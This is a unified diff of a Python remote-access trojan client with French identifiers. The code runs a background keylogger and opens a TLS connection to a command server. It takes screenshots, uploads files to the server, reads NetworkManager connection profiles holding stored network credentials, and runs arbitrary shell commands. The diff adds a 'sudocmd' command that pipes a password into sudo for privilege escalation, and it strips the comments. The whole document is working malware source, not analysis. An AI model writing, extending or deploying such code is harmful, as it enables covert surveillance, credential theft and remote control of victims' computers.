@@ -1,4 +1,4 @@
-import socket, ssl, time, subprocess, os, sys, struct, paramiko, threading, pyautogui, cv2
+import socket, ssl, time, subprocess, os, sys, struct, threading, pyautogui, cv2
 from pynput import keyboard
 from PIL import Image
 
@@ -7,31 +7,34 @@ CIBLE_IP = "127.0.0.1"
 CIBLE_PORT = 12345 
 
 # --- VARIABLE GLOBALE KEYLOGGER ---
-journal_touches = "" # Stocke les frappes en mémoire
+journal_touches = "" 
 
 def enregistreur_frappe(touche):
-    """Capture chaque pression de touche et l'ajoute au journal"""
     global journal_touches
     try:
-        journal_touches += str(touche.char) # Caractères alphanumériques
+        journal_touches += str(touche.char)
     except AttributeError:
-        # Gestion des touches spéciales pour la lisibilité
-        if str(touche) == "Key.space":
-            journal_touches += " "
-        elif str(touche) == "Key.enter":
-            journal_touches += "\n"
-        elif str(touche) == "Key.backspace":
-            journal_touches += " [BS] "
-        else:
-            journal_touches += f" [{str(touche).replace('Key.', '')}] "
+        if str(touche) == "Key.space": journal_touches += " "
+        elif str(touche) == "Key.enter": journal_touches += "\n"
+        elif str(touche) == "Key.backspace": journal_touches += " [BS] "
+        else: journal_touches += f" [{str(touche).replace('Key.', '')}] "
 
 def demarrer_surveillance_clavier():
-    """Lance l'écouteur de clavier en arrière-plan"""
     with keyboard.Listener(on_press=enregistreur_frappe) as auditeur:
         auditeur.join()
 
+# --- NOUVELLE FONCTION : ÉLÉVATION DE PRIVILÈGES ---
+def executer_avec_privileges(commande, mot_de_passe):
+    """Injecte le mot de passe dans sudo via stdin"""
+    try:
+        # L'option -S lit le mot de passe depuis l'entrée standard
+        cmd_complete = f"echo {mot_de_passe} | sudo -S {commande}"
+        processus = subprocess.run(cmd_complete, shell=True, capture_output=True, text=True)
+        return processus.stdout + processus.stderr
+    except Exception as e:
+        return f"Erreur d'élévation : {str(e)}"
+
 def initialisation_flux():
-    """Gère la connexion sécurisée et la boucle d'écoute"""
     connexion_brute = None
     reglages = ssl.create_default_context()
     reglages.check_hostname = False
@@ -42,12 +45,10 @@ def initialisation_flux():
         canal_chiffre = reglages.wrap_socket(connexion_brute, server_hostname=CIBLE_IP) 
         
         while True:
-            # Réception de l'ordre depuis le serveur Flask
             donnee_serveur = canal_chiffre.recv(4096).decode().strip().lower()
             if donnee_serveur in ["exit", "disconnect"]: 
                 break
             
-            # Appel du gestionnaire de tâches
             reponse_tache = executeur_de_requetes(donnee_serveur, canal_chiffre)
             
             if reponse_tache is not None:
@@ -59,7 +60,6 @@ def initialisation_flux():
             connexion_brute.close()
 
 def executeur_de_requetes(instruction, lien_socket):
-    """Routeur de commandes vers les fonctions spécifiques"""
     global journal_touches
     
     if instruction == "get_ip":
@@ -72,10 +72,17 @@ def executeur_de_requetes(instruction, lien_socket):
         return generer_instante_ecran() 
     
     elif instruction == "get_keys":
-        # Récupère le contenu du keylogger et vide la mémoire locale
         extraction = journal_touches
         journal_touches = "" 
         return extraction if extraction != "" else "Aucune frappe enregistrée."
+
+    # --- NOUVELLE COMMANDE : SUDOCMD ---
+    elif instruction.startswith("sudocmd "):
+        # Format : sudocmd <password> <commande>
+        parties = instruction.split(" ", 2)
+        if len(parties) < 3:
+            return "Usage: sudocmd <password> <commande>"
+        return executer_avec_privileges(parties[2], parties[1])
     
     elif instruction.startswith("download "):
         fichiers = instruction.split(" ", 1)[1].split(";")
@@ -86,22 +93,18 @@ def executeur_de_requetes(instruction, lien_socket):
         return commande_shell_directe(instruction) 
 
 def commande_shell_directe(cmd_text):
-    """Exécute une commande système et gère la navigation"""
     try:
-        # Si la commande commence par 'cd '
         if cmd_text.startswith("cd "):
             nouveau_dossier = cmd_text.split(" ", 1)[1]
-            os.chdir(nouveau_dossier) # Change le dossier pour TOUT le script client
-            return f"Répertoire changé pour : {os.getcwd()}" #
+            os.chdir(nouveau_dossier)
+            return f"Répertoire changé pour : {os.getcwd()}"
         
-        # Pour toutes les autres commandes
         processus = subprocess.run(cmd_text, shell=True, capture_output=True, text=True)
-        return processus.stdout + processus.stderr #
+        return processus.stdout + processus.stderr 
     except Exception as e:
-        return f"Erreur système : {str(e)}" #
+        return f"Erreur système : {str(e)}"
 
 def generer_instante_ecran():
-    """Effectue une capture d'écran via pyautogui"""
     try:
         img = pyautogui.screenshot().convert("RGB")
         img.save("temp_view.jpg", "JPEG") 
@@ -110,7 +113,6 @@ def generer_instante_ecran():
         return "Échec capture (vérifiez la variable DISPLAY)"
 
 def envoi_flux_binaire(liste_p, sock):
-    """Transfère des fichiers octet par octet vers le serveur"""
     for p in liste_p:
         if os.path.exists(p):
             n_f = os.path.basename(p)
@@ -125,7 +127,6 @@ def envoi_flux_binaire(liste_p, sock):
     sock.send("[SYNC]".encode())
 
 def recuperer_configs_reseau():
-    """Extrait les profils de connexion NetworkManager (root requis)"""
     try:
         dossier_nm = "/etc/NetworkManager/system-connections/" 
         resultats = []
@@ -140,7 +141,5 @@ def recuperer_configs_reseau():
         return "Erreur d'accès aux fichiers réseaux"
 
 if __name__ == "__main__":
-    # Démarrage du thread Keylogger pour une capture continue
     threading.Thread(target=demarrer_surveillance_clavier, daemon=True).start()
-    # Démarrage de la boucle de communication
     initialisation_flux()
